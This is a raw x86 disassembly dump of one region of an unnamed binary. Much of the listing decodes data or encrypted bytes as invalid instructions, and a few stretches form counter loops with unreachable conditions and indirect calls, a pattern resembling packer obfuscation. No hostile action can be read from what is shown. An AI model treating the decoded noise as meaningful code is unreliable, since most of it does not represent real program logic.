  409bda:	add    DWORD PTR [eax-0x73],edx
  409bdd:	pop    esp
  409bde:	addr16 pop ecx
  409be0:	mov    ebp,0x951ed8fe
  409be5:	jecxz  0x409ba5
  409be7:	mov    bl,0xd0
  409be9:	push   0xffffffb8
  409beb:	test   al,0xfe
  409bed:	jnp    0x409bdd
  409bef:	ss fs dec ecx
  409bf2:	inc    edi
  409bf3:	dec    edx
  409bf4:	mov    ds:0xf5c884a6,eax
  409bf9:	mov    ecx,DWORD PTR [ebp+ebx*2-0x4188af05]
  409c00:	mul    DWORD PTR [edi-0x3e6547b4]
  409c06:	pop    ds
  409c07:	into   
  409c08:	repz xchg edi,eax
  409c0a:	sbb    dh,BYTE PTR [edi-0x24ff5f16]
  409c10:	imul   edx,DWORD PTR [edi+0x2a880c8b],0xfffffffb
  409c17:	push   ss
  409c18:	or     cl,BYTE PTR [ebx-0x3240d96e]
  409c1e:	xchg   ebx,edi
  409c20:	aam    0x67
  409c22:	jecxz  0x409c02
  409c24:	pop    ebx
  409c25:	nop
  409c26:	cli    
  409c27:	and    edi,ecx
  409c29:	cmp    DWORD PTR [ebx],esi
  409c2b:	mov    eax,ds:0x5b575418
  409c30:	leavew 
  409c32:	sbb    ebp,ebp
  409c34:	cdq    
  409c35:	imul   eax,DWORD PTR [ebp-0x5dae8ddc],0xc1eed89d
  409c3f:	adc    ch,BYTE PTR [edx+edx*2]
  409c42:	fstp   QWORD PTR [ebx-0x7c]
  409c45:	xor    ebx,DWORD PTR [eax+0x48]
  409c48:	or     BYTE PTR [ecx-0x3a],ch
  409c4b:	mov    esi,?
  409c4d:	fcomp  DWORD PTR [edx]
  409c4f:	frstor [ecx-0x6c]
  409c52:	pop    ss
  409c53:	mov    al,0xc
  409c55:	repnz add al,cl
  409c58:	aas    
  409c59:	lods   al,BYTE PTR ds:[esi]
  409c5a:	ret    
  409c5b:	inc    edx
  409c5c:	or     BYTE PTR [esi+ebx*4-0x737dae3b],cl
  409c63:	mov    dl,0x5c
  409c65:	xchg   ebp,eax
  409c66:	in     eax,dx
  409c67:	mov    ebx,0x7a6aaee1
  409c6c:	xor    DWORD PTR [edi-0x49],eax
  409c6f:	sbb    eax,0x3f3956e2
  409c74:	jle    0x409c0b
  409c76:	sub    ah,0x46
  409c79:	jmp    0x409cc3
  409c7b:	stos   DWORD PTR es:[edi],eax
  409c7c:	and    al,0xdd
  409c7e:	fisubr WORD PTR [ecx+eiz*1]
  409c81:	fisttp WORD PTR gs:[edx-0x69]
  409c85:	jge    0x409cc6
  409c87:	mov    ebx,esi
  409c89:	inc    ebx
  409c8a:	pop    eax
  409c8b:	stos   BYTE PTR es:[edi],al
  409c8c:	sbb    al,0x14
  409c8e:	dec    esi
  409c8f:	cmc    
  409c90:	sub    eax,0x54c8ba60
  409c95:	sbb    al,0x3a
  409c97:	aad    0xc3
  409c99:	fisttp WORD PTR [esi-0x3ef71862]
  409c9f:	in     eax,0xe
  409ca1:	inc    ecx
  409ca2:	jmp    0x4959f543
  409ca7:	and    DWORD PTR [esi],edi
  409ca9:	jmp    0x7c03:0x82ffb504
  409cb0:	mov    al,0xef
  409cb2:	xchg   ebp,eax
  409cb3:	mov    ebp,0x5013198c
  409cb8:	sbb    eax,0x5767c1e4
  409cbd:	fxch   st(2)
  409cbf:	pop    edx
  409cc0:	mov    ds:0x398a6611,eax
  409cc5:	call   0x684429ef
  409cca:	bound  edx,QWORD PTR [esi]
  409ccc:	cmc    
  409ccd:	xor    al,BYTE PTR [eax]
  409ccf:	jbe    0x409d1c
  409cd1:	test   eax,0xcf23c45
  409cd6:	retf   0x7b21
  409cd9:	in     al,dx
  409cda:	sbb    BYTE PTR [ebx+ebx*4],ah
  409cdd:	pop    ss
  409cde:	hlt    
  409cdf:	jo     0x409c63
  409ce1:	lods   eax,DWORD PTR ds:[esi]
  409ce2:	mov    DWORD PTR [edx-0x5f],edx
  409ce5:	lods   eax,DWORD PTR ds:[esi]
  409ce6:	int3   
  409ce7:	pusha  
  409ce8:	xor    eax,0x4214dbdf
  409ced:	mov    WORD PTR [ebx-0x43],cs
  409cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cf1:	dec    edi
  409cf2:	sub    eax,0xf32ee875
  409cf7:	loope  0x409d4e
  409cf9:	ror    DWORD PTR [ebp-0x34],0x36
  409cfd:	push   ebp
  409cfe:	sahf   
  409cff:	inc    esp
  409d00:	or     al,0x78
  409d02:	adc    BYTE PTR [esi-0x3f9b7c58],dh
  409d08:	fnsave [ebx-0x24114c27]
  409d0e:	pop    edi
  409d0f:	jb     0x409cdb
  409d11:	cmp    DWORD PTR gs:[ebx+0x44],ebx
  409d15:	in     eax,dx
  409d16:	lock jnp 0x409cda
  409d19:	xor    al,0x3c
  409d1b:	rcl    BYTE PTR [ebx+0x6f],cl
  409d1e:	and    DWORD PTR [esi+0x37],edx
  409d21:	call   0x37324fe7
  409d26:	xchg   DWORD PTR [ebp-0x12d574a8],ecx
  409d2c:	sub    ecx,eax
  409d2e:	gs stc 
  409d30:	push   ss
  409d31:	mov    cl,ch
  409d33:	xor    BYTE PTR [ebp+0x57b35382],ah
  409d39:	outs   dx,BYTE PTR ds:[esi]
  409d3a:	and    ecx,edi
  409d3c:	or     eax,0xc8471dd4
  409d41:	in     eax,dx
  409d42:	outs   dx,BYTE PTR fs:[si]
  409d45:	out    0x1e,eax
  409d47:	push   esp
  409d48:	mov    cl,0xeb
  409d4a:	out    0x45,al
  409d4c:	lock sbb BYTE PTR [ebx+0x2beb0312],al
  409d53:	adc    cl,BYTE PTR [ebx-0x6]
  409d56:	jno    0x409dcc
  409d58:	mov    edi,0x57a6839
  409d5d:	pop    ebx
  409d5e:	mov    cl,al
  409d60:	fbstp  TBYTE PTR [edi]
  409d62:	jl     0x409d4a
  409d64:	push   eax
  409d65:	loop   0x409d9b
  409d67:	sbb    al,BYTE PTR [ebp-0x7724be0]
  409d6d:	jp     0x409d39
  409d6f:	xchg   DWORD PTR ds:0x7c9b8c98,edi
  409d75:	mov    ds:0x181cdfa6,eax
  409d7a:	or     al,cl
  409d7c:	push   edx
  409d7d:	jmp    0x8560b09d
  409d82:	leave  
  409d83:	mov    DWORD PTR ds:0x433797,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43378b
  409d9c:	sub    DWORD PTR ds:0x43385f,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x4337d3,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	or     cl,ch
  409dc0:	and    ecx,edx
  409dc2:	cmp    dl,ah
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	ins    DWORD PTR es:[edi],dx
  409dcb:	hlt    
  409dcc:	xor    al,0xc0
  409dce:	mov    ch,0x1b
  409dd0:	jp     0x409dff
  409dd2:	fiadd  WORD PTR [ebx]
  409dd4:	into   
  409dd5:	push   ebp
  409dd6:	add    DWORD PTR [edx+0x52],0xffffff8b
  409dda:	inc    eax
  409ddb:	mov    esi,0x1ad76208
  409de0:	mov    dl,0xf3
  409de2:	hlt    
  409de3:	xchg   ch,dh
  409de5:	scas   al,BYTE PTR es:[edi]
  409de6:	push   ebp
  409de7:	inc    ebx
  409de8:	pop    eax
  409de9:	pushf  
  409dea:	or     edi,ebp
  409dec:	sti    
  409ded:	and    BYTE PTR [ecx+ebx*1+0x16],dh
  409df1:	call   0xb27e:0xfd8d5617
  409df8:	fldenv [ebx]
  409dfa:	push   ebp
  409dfb:	dec    edi
  409dfc:	adc    eax,0x1c852ee3
  409e01:	mov    dh,0xfd
  409e03:	cmp    al,0x5b
  409e05:	push   ecx
  409e06:	pusha  
  409e07:	loopne 0x409e54
  409e09:	call   0xf43751d4
  409e0e:	mov    edi,0xb082d4e9
  409e13:	sub    ch,BYTE PTR [eax-0x2]
  409e16:	fld    QWORD PTR [ecx+edi*1-0x75a2759e]
  409e1d:	punpckhwd mm5,QWORD PTR [ecx+0x3aaf327a]
  409e24:	inc    edi
  409e25:	ds jl  0x409e61
  409e28:	int3   
  409e29:	or     eax,0x82ce5b6e
  409e2e:	xchg   DWORD PTR [edi+eax*8+0x75c52ef7],edx
  409e35:	jo     0x409de3
  409e37:	lock stos DWORD PTR es:[edi],eax
  409e39:	pushf  
  409e3a:	test   esi,esi
  409e3c:	xchg   edx,eax
  409e3d:	cmc    
  409e3e:	sahf   
  409e3f:	add    DWORD PTR [ebx-0x2875f3ed],ebx
  409e45:	les    eax,FWORD PTR [edx]
  409e47:	into   
  409e48:	adc    eax,0x79396147
  409e4d:	xchg   edx,eax
  409e4e:	jp     0x409e94
  409e50:	in     eax,dx
  409e51:	and    esi,DWORD PTR [ebp+esi*2+0x55]
  409e55:	xchg   ebx,eax
  409e56:	adc    BYTE PTR [eax+eax*4-0x63],ah
  409e5a:	mov    cl,0x1d
  409e5c:	gs sbb al,0xed
  409e5f:	adc    edi,DWORD PTR [edi-0x14ac6a46]
  409e65:	fstp   DWORD PTR [eax+0x32c7e41c]
  409e6b:	loope  0x409e7b
  409e6d:	and    BYTE PTR [ebp+0x5a4ff51b],0x88
  409e74:	inc    ecx
  409e75:	mov    esi,0xa7b191e9
  409e7a:	retf   
  409e7b:	or     DWORD PTR [ebx+0x5],ebp
  409e7e:	push   edx
  409e7f:	xor    BYTE PTR [eax],cl
  409e81:	mov    ebx,0xf605de0f
  409e86:	pop    esi
  409e87:	leave  
  409e88:	test   DWORD PTR [edx],0x2779f8b3
  409e8e:	loope  0x409ede
  409e90:	pop    ecx
  409e91:	shr    DWORD PTR [ebx+edx*4+0x3519d861],0xd4
  409e99:	mov    ah,0x91
  409e9b:	stc    
  409e9c:	mov    ecx,0x367803d0
  409ea1:	rol    cl,1
  409ea3:	dec    DWORD PTR ds:0xf6db8d32
  409ea9:	ret    0xc94
  409eac:	stc    
  409ead:	add    al,0x7
  409eaf:	lods   eax,DWORD PTR ds:[esi]
  409eb0:	mov    eax,ds:0xc7ae08e9
  409eb5:	out    0xe0,eax
  409eb7:	mov    DWORD PTR ds:0xae4bf355,0x3fc9d85d
  409ec1:	push   esp
  409ec2:	adc    eax,0xdbfb2bfd
  409ec7:	mov    edi,0x3297c2ba
  409ecc:	add    al,0x50
  409ece:	push   edi
  409ecf:	cmp    esp,DWORD PTR [edi-0x5aa64e32]
  409ed5:	scas   al,BYTE PTR es:[edi]
  409ed6:	jecxz  0x409f3d
  409ed8:	call   0x57378994
  409edd:	mov    esi,0x97e1217e
  409ee2:	nop
  409ee3:	xor    eax,0x72d71418
  409ee8:	aas    
  409ee9:	lea    esi,[esi]
  409eeb:	pop    ebp
  409eec:	dec    edi
  409eed:	cmp    esi,DWORD PTR [ecx]
  409eef:	inc    eax
  409ef0:	in     eax,0x3b
  409ef2:	cmp    ebp,ecx
  409ef4:	inc    ecx
  409ef5:	cmp    esp,DWORD PTR [edx]
  409ef7:	inc    edx
  409ef8:	jno    0x409e92
  409efa:	dec    ecx
  409efb:	fcomp  DWORD PTR [edx]
  409efd:	mov    ebp,0x6cc45b05
  409f02:	or     BYTE PTR [ebp+0xe556aee],ch
  409f08:	repz xor BYTE PTR [ebx],0x34
  409f0c:	lods   al,BYTE PTR ds:[esi]
  409f0d:	jnp    0x409ef2
  409f0f:	ret    
  409f10:	dec    eax
  409f11:	inc    esp
  409f12:	mov    ebp,0x14cd0617
  409f17:	mov    ch,0x7e
  409f19:	aas    
  409f1a:	jge    0x409ebf
  409f1c:	pop    ds
  409f1d:	test   eax,0x8ece8f55
  409f22:	xor    cl,cl
  409f24:	jnp    0x409ecc
  409f26:	cmc    
  409f27:	add    DWORD PTR ds:0x582efe5d,0x3b9bf0d1
  409f31:	and    al,0x68
  409f33:	in     al,dx
  409f34:	dec    ebp
  409f35:	jo     0x409f7f
  409f37:	mov    esp,0x24488178
  409f3d:	dec    esp
  409f3e:	push   ebx
  409f3f:	dec    edx
  409f40:	xchg   edx,eax
  409f41:	mov    eax,ds:0xe163c70a
  409f46:	stos   DWORD PTR es:[edi],eax
  409f47:	xor    al,0xf2
  409f49:	cld    
  409f4a:	cmp    DWORD PTR [ebx+eiz*2],eax
  409f4d:	push   eax
  409f4e:	ror    DWORD PTR ds:0x5788a08f,0xd0
  409f55:	inc    edx
  409f56:	test   eax,0x93588c32
  409f5b:	xor    ah,BYTE PTR [edi]
  409f5d:	mov    bl,0x3b
  409f5f:	stc    
  409f60:	les    esi,FWORD PTR [eax]
  409f62:	inc    ebp
  409f63:	in     al,dx
  409f64:	(bad)
  409f67:	dec    DWORD PTR [esi-0x4f]
  409f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f6b:	mov    ebp,0xad62b72d
  409f70:	pop    eax
  409f71:	call   0x10fb:0xf18a0538
  409f78:	jns    0x409f57
  409f7a:	jne    0x409fd9
  409f7c:	retf   0x15d3
  409f7f:	jnp    0x409f84
  409f81:	hlt    
  409f82:	and    esp,DWORD PTR [eax+0x5a919cbd]
  409f88:	xchg   esi,eax
  409f89:	cmp    bh,bl
  409f8b:	xchg   esp,eax
  409f8c:	repnz push ecx
  409f8e:	(bad)  
  409f90:	push   esi
  409f91:	lods   eax,DWORD PTR ds:[esi]
  409f92:	fs sti 
  409f94:	sub    BYTE PTR [edx],bh
  409f96:	lahf   
  409f97:	(bad)  
  409f98:	aad    0x65
  409f9a:	mov    dh,0x3f
  409f9c:	jg     0x409ffe
  409f9e:	stos   DWORD PTR es:[edi],eax
  409f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fa0:	rcr    eax,cl
  409fa2:	dec    ecx
  409fa3:	lahf   
  409fa4:	aam    0x55
  409fa6:	mov    eax,0x93c1fe38
  409fab:	rol    DWORD PTR [ebx+0xe],0xcf
  409faf:	jno    0x40a022
  409fb1:	loopne 0x409f9d
  409fb3:	mov    esp,0x36ad9b69
  409fb8:	lea    edx,[ecx-0x28bb91b0]
  409fbe:	adc    al,0x38
  409fc0:	jg     0x40a020
  409fc2:	inc    ebx
  409fc3:	fldenv [ecx-0x70]
  409fc6:	inc    edx
  409fc7:	fnsetpm(287 only) 
  409fc9:	mov    bh,0x96
  409fcb:	cld    
  409fcc:	clc    
  409fcd:	pop    edi
  409fce:	and    DWORD PTR [esi+0x21376520],ecx
  409fd4:	pop    es
  409fd5:	ins    BYTE PTR es:[edi],dx
  409fd6:	jno    0x40a02b
  409fd8:	jno    0x409f64
  409fda:	xchg   edx,eax
  409fdb:	jecxz  0x409f70
  409fdd:	cmp    esp,0xffffffc0
  409fe0:	loope  0x409ff1
  409fe2:	inc    BYTE PTR [eiz*4+0x2eef7eff]
  409fe9:	pop    ebp
  409fea:	not    BYTE PTR [ebx-0x63]
  409fed:	(bad)  
  409fee:	iret   
  409fef:	sub    edx,ebp
  409ff1:	sub    bh,BYTE PTR [edx+0x58e9d1fd]
  409ff7:	(bad)  
  409ff8:	lods   al,BYTE PTR ds:[esi]
  409ff9:	push   ebx
  409ffa:	lea    ecx,ds:0x2c833506
  40a000:	add    ah,BYTE PTR [edx]
  40a002:	ror    BYTE PTR [edi+ebp*4+0x5dc12539],0xd6
  40a00a:	mov    dh,0x8e
  40a00c:	mov    cl,0x61
  40a00e:	add    al,0x7d
  40a010:	imul   edx,eax
  40a013:	mov    ecx,0x4573
  40a018:	mov    edi,DWORD PTR ds:0x433853
  40a01e:	sbb    DWORD PTR ds:0x43378f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x4337e3,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x4337a3
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x4337db,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x4337db
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x4337db,ecx
  40a059:	cmp    DWORD PTR ds:0x4337db,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x4339be
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x4337db,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43378b,0x11
  40a090:	cmp    DWORD PTR ds:0x43378b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43378b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43378b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43378b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43378b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43378b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43378b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433783,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x4337ef
  40a0f9:	sub    ecx,DWORD PTR ds:0x433793
  40a0ff:	mov    DWORD PTR ds:0x4337ef,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x4337e7,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	jne    0x40a17b
  40a128:	call   0x387e:0x7ee082fa
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a1b0
  40a133:	xlat   BYTE PTR ds:[ebx]
  40a134:	mov    ds:0xa944d914,al
  40a139:	sbb    BYTE PTR [esi+0x11],al
  40a13c:	adc    al,0x33
  40a13e:	xor    al,0xbf
  40a140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a141:	retf   0xae87
  40a144:	hlt    
  40a145:	mov    al,ds:0x6cb2ff08
  40a14a:	ficom  DWORD PTR [ebp-0x5b]
  40a14d:	sbb    eax,DWORD PTR [ebx-0x3f]
  40a150:	arpl   WORD PTR [esi+0x2f],bp
  40a153:	int    0xd4
  40a155:	aam    0xd3
  40a157:	pop    ds
  40a158:	push   ebp
  40a159:	(bad)  
  40a15a:	pop    ss
  40a15b:	xchg   BYTE PTR [ecx+0x71e8af3e],dl
  40a161:	dec    ebp
  40a162:	jmp    0x40a149
  40a164:	push   ecx
  40a165:	test   eax,0x78e78053
  40a16a:	bound  ecx,QWORD PTR [eax+0x1845ed13]
  40a170:	xor    eax,0x73e3a81b
  40a175:	pushf  
  40a176:	jnp    0x40a1b7
  40a178:	push   esi
  40a179:	xor    ebp,DWORD PTR [edx+eiz*1]
  40a17c:	inc    ecx
  40a17d:	(bad)  
  40a17e:	xor    DWORD PTR ds:0xa7ae1d4f,esi
  40a184:	cli    
  40a185:	das    
  40a186:	mov    ds:0xa613c666,eax
  40a18b:	scas   al,BYTE PTR es:[edi]
  40a18c:	clc    
  40a18d:	inc    ebx
  40a18e:	ret    
  40a18f:	(bad)  
  40a191:	scas   al,BYTE PTR es:[edi]
  40a192:	sub    al,0xed
  40a194:	fs mov bl,0xd8
  40a197:	addr16 push ecx
  40a199:	js     0x40a1f4
  40a19b:	pop    edi
  40a19c:	fdivr  DWORD PTR [edi-0x3a]
  40a19f:	push   esi
  40a1a0:	mov    ebx,0x725ff898
  40a1a5:	mov    BYTE PTR [edi-0x2f],dl
  40a1a8:	(bad)  
  40a1a9:	imul   ebx,DWORD PTR ds:0xbe58152a,0x80f27e6e
  40a1b3:	imul   ebp,DWORD PTR [ebx+edi*2-0x17],0x78
  40a1b8:	fnstsw WORD PTR ds:0xcbf54f3b
  40a1be:	ret    
  40a1bf:	repnz nop
  40a1c1:	stos   DWORD PTR es:[edi],eax
  40a1c2:	into   
  40a1c3:	test   al,0x59
  40a1c5:	lods   al,BYTE PTR ds:[esi]
  40a1c6:	pop    edx
  40a1c7:	test   al,0x21
  40a1c9:	cmp    eax,0x2e17a7ae
  40a1ce:	push   ss
  40a1cf:	sbb    eax,0x2e1c69a4
  40a1d4:	js     0x40a221
  40a1d6:	std    
  40a1d7:	(bad)  
  40a1d8:	or     eax,DWORD PTR [eax+0x2680b830]
  40a1de:	dec    ecx
  40a1df:	in     al,0xd8
  40a1e1:	and    eax,0xe873cd05
  40a1e6:	in     al,dx
  40a1e7:	jae    0x40a20e
  40a1e9:	bound  ecx,QWORD PTR [edi-0x72]
  40a1ec:	outs   dx,DWORD PTR ds:[esi]
  40a1ed:	and    DWORD PTR ds:0x7194a7bc,esp
  40a1f3:	xor    BYTE PTR [ecx+0x3f],al
  40a1f6:	out    dx,eax
  40a1f7:	hlt    
  40a1f8:	xor    esi,esp
  40a1fa:	cmp    edx,eax
  40a1fc:	in     al,dx
  40a1fd:	mov    WORD PTR [edi],?
  40a1ff:	xor    DWORD PTR [esi-0x285c8a8a],0xffffffc8
  40a206:	inc    esp
  40a207:	leave  
  40a208:	adc    BYTE PTR [ebx+0x4d91b8e6],0xf4
  40a20f:	fdiv   DWORD PTR [edi+ebx*4]
  40a212:	inc    BYTE PTR [eax+0x40]
  40a215:	jbe    0x40a286
  40a217:	push   cs
  40a218:	adc    eax,0xb923309c
  40a21d:	jecxz  0x40a26e
  40a21f:	dec    edx
  40a220:	sub    dl,ah
  40a222:	add    DWORD PTR [ecx+0x3d9ef443],ecx
  40a228:	scas   al,BYTE PTR es:[edi]
  40a229:	push   eax
  40a22a:	push   ds
  40a22b:	pop    eax
  40a22c:	and    al,0x61
  40a22e:	pop    ebx
  40a22f:	bound  esi,QWORD PTR [eax-0x1b]
  40a232:	in     eax,0x5e
  40a234:	div    BYTE PTR [eax-0x51]
  40a237:	dec    esi
  40a238:	mov    cl,0xdf
  40a23a:	loop   0x40a274
  40a23c:	or     eax,0xfe0b47e5
  40a241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a242:	(bad)  
  40a243:	mov    eax,ds:0x2f8c5dd9
  40a248:	cli    
  40a249:	xchg   esp,eax
  40a24a:	sub    bh,bl
  40a24c:	sub    ebx,DWORD PTR [eax-0x7fad29aa]
  40a252:	jp     0x40a1e7
  40a254:	xchg   edx,eax
  40a255:	and    DWORD PTR [edi+0x13],esp
  40a258:	lods   eax,DWORD PTR ds:[esi]
  40a259:	mov    ch,0x4e
  40a25b:	pop    edx
  40a25c:	repnz fcom QWORD PTR [ebp-0x62]
  40a260:	sti    
  40a261:	fldcw  WORD PTR ds:0x89d25dc7
  40a267:	retf   
  40a268:	mov    esp,0x85b15ca7
  40a26d:	clc    
  40a26e:	pushf  
  40a26f:	ret    0x6343
  40a272:	(bad)  
  40a273:	jmp    0x40a20a
  40a275:	cmp    BYTE PTR [edx-0x5aabbf51],bh
  40a27b:	stos   BYTE PTR es:[edi],al
  40a27c:	sahf   
  40a27d:	mov    dl,0xd3
  40a27f:	(bad)  [edi-0x47]
  40a282:	mov    edx,edx
  40a284:	inc    ebx
  40a285:	xor    eax,ebp
  40a287:	jo     0x40a2de
  40a289:	repz loop 0x40a2ac
  40a28c:	jmp    0x40a2c6
  40a28e:	js     0x40a2d7
  40a290:	ins    DWORD PTR es:[edi],dx
  40a291:	and    ecx,DWORD PTR [ecx-0x2818f029]
  40a297:	dec    eax
  40a298:	lods   eax,DWORD PTR ds:[esi]
  40a299:	sbb    eax,0xfcd46bcb
  40a29e:	in     al,0x33
  40a2a0:	mov    dl,0xcd
  40a2a2:	sbb    eax,0xbe7e0441
  40a2a7:	push   esp
  40a2a8:	xchg   ebx,eax
  40a2a9:	sub    al,0x7d
  40a2ab:	mov    bl,BYTE PTR [edi+0x128ae0ef]
  40a2b1:	imul   ecx,DWORD PTR [ebp+0x5065df37],0x41f545a9
  40a2bb:	inc    edi
  40a2bc:	aas    
  40a2bd:	pop    ebx
  40a2be:	ror    DWORD PTR [edx+0x19],1
  40a2c1:	mov    ch,0x2a
  40a2c3:	mov    esp,0x8bb41afd
  40a2c8:	and    cl,BYTE PTR [ebx+0x7]
  40a2cb:	mov    BYTE PTR [ecx-0xa4356e1],cl
  40a2d1:	in     eax,dx
  40a2d2:	call   edi
  40a2d4:	add    ch,BYTE PTR [ebx]
  40a2d6:	pop    esp
  40a2d7:	stc    
  40a2d8:	aaa    
  40a2d9:	cmp    eax,0x5ee880f7
  40a2de:	mov    ah,0xbd
  40a2e0:	pop    esi
  40a2e1:	push   ebx
  40a2e2:	mov    ?,ebx
  40a2e4:	push   eax
  40a2e5:	lahf   
  40a2e6:	imul   ebx,DWORD PTR [eax-0x48552017],0x62bc9fa5
  40a2f0:	xchg   edi,eax
  40a2f1:	add    DWORD PTR [ebx+eiz*1+0xc],0x708f38a6
  40a2f9:	mov    dl,BYTE PTR [eax+0x69]
  40a2fc:	jno    0x40a32c
  40a2fe:	je     0x40a2b0
  40a300:	xchg   edi,eax
  40a301:	lods   eax,DWORD PTR ds:[esi]
  40a302:	ss jbe 0x40a2ab
  40a305:	mov    dl,0xb6
  40a307:	mov    ebp,0x66769d86
  40a30c:	out    0x52,eax
  40a30e:	jno    0x40a2ea
  40a310:	aad    0x2f
  40a312:	sub    DWORD PTR [ebp+0x444bed21],ebx
  40a318:	loopne 0x40a308
  40a31a:	add    dh,BYTE PTR [bp+0x6f]
  40a31e:	add    ah,BYTE PTR [esp+ecx*2+0x54]
  40a322:	inc    ebp
  40a323:	shr    bh,cl
  40a325:	jle    0x40a32c
  40a327:	mov    ?,WORD PTR [ecx-0x574e7588]
  40a32d:	push   ebx
  40a32e:	out    dx,eax
  40a32f:	and    DWORD PTR [ebp-0x75def8c0],0xfffffff4
  40a336:	sbb    edi,DWORD PTR [esi]
  40a338:	hlt    
  40a339:	sbb    al,0xc8
  40a33b:	push   esi
  40a33c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a33d:	and    edx,ebx
  40a33f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a340:	jg     0x40a30a
  40a342:	push   ebx
  40a343:	out    dx,al
  40a344:	dec    eax
  40a345:	mov    WORD PTR [eax],?
  40a347:	stos   BYTE PTR es:[edi],al
  40a348:	push   ecx
  40a349:	and    al,0x2f
  40a34b:	outs   dx,DWORD PTR ds:[esi]
  40a34c:	out    dx,al
  40a34d:	xor    ah,0xbb
  40a350:	int3   
  40a351:	das    
  40a352:	retf   0xb69d
  40a355:	loop   0x40a312
  40a357:	cwde   
  40a358:	shl    DWORD PTR [ecx],0x7e
  40a35b:	push   esp
  40a35c:	stos   BYTE PTR es:[edi],al
  40a35d:	(bad)  
  40a35e:	daa    
  40a35f:	inc    esi
  40a360:	mov    bh,0x4a
  40a362:	(bad)  
  40a363:	stc    
  40a364:	xor    al,0x4c
  40a366:	sub    bl,BYTE PTR [ecx]
  40a368:	out    dx,al
  40a369:	clc    
  40a36a:	scas   al,BYTE PTR es:[edi]
  40a36b:	int3   
  40a36c:	mov    bh,0x64
  40a36e:	mov    ds:0x97a74800,al
  40a373:	(bad)  
  40a374:	retf   0xf31f
  40a377:	sahf   
  40a378:	mov    ecx,DWORD PTR [ebp-0x18]
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x43377b,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x43377b
  40a394:	inc    eax
  40a395:	mov    ds:0x43377b,eax
  40a39a:	cmp    DWORD PTR ds:0x43377b,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x43377b,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x43386f
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x4337eb
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x4337e7,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x4337e7,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x4337e7,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433817
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x4337e7,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x4337e7
  40a434:	dec    eax
  40a435:	mov    ds:0x4337e7,eax
  40a43a:	mov    eax,ds:0x4337e7
  40a43f:	dec    eax
  40a440:	mov    ds:0x4337e7,eax
  40a445:	jmp    0x40a3ed
